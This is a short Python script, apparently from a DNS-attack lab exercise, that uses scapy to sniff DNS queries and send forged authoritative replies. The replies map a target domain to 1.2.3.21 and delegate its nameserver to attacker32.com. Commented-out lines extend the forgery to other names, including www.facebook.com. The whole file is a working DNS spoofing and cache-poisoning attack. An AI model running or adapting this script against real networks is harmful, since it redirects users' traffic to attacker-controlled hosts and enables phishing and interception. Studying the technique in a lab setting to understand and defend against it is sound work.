#!/usr/bin/python
from scapy.all import *

def spoof_dns(pkt):
    if (DNS in pkt and 'www.myounkerT7.net' in pkt[DNS].qd.qname):
        # Swap the source and destination IP address
        IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)

        # Swap the source and destination port number
        UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)

        # The Answer Section
        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A',
        ttl=259200, rdata='1.2.3.21')

        # The Authority Section
        NSsec1 = DNSRR(rrname='myounkerT7.net', type='NS',
        ttl=259200, rdata='attacker32.com')
        #NSsec2 = DNSRR(rrname='myounkerT9.net', type='NSs',
        #ttl=259200, rdata='ns.myounkerT9.net')

        # The Additional Section
        #Addsec1 = DNSRR(rrname='attacker32.com', type='A',
        #ttl=259200, rdata='1.2.3.21')
        #Addsec2 = DNSRR(rrname='ns.myounkerT9.net', type='A',
        #ttl=259200, rdata='1.2.3.121')
        #Addsec3 = DNSRR(rrname='www.facebook.com', type='A',
        #ttl=259200, rdata='1.2.3.221')

        # Construct the DNS packet
        DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1, 
        qdcount=1, ancount=1, nscount=1, arcount=0,
        an=Anssec, ns=NSsec1)

        # Construct the entire IP packet and send it out
        spoofpkt = IPpkt/UDPpkt/DNSpkt
        send(spoofpkt)

# Sniff UDP query packets and invoke spoof_dns().
pkt = sniff(filter='udp and dst port 53', prn=spoof_dns)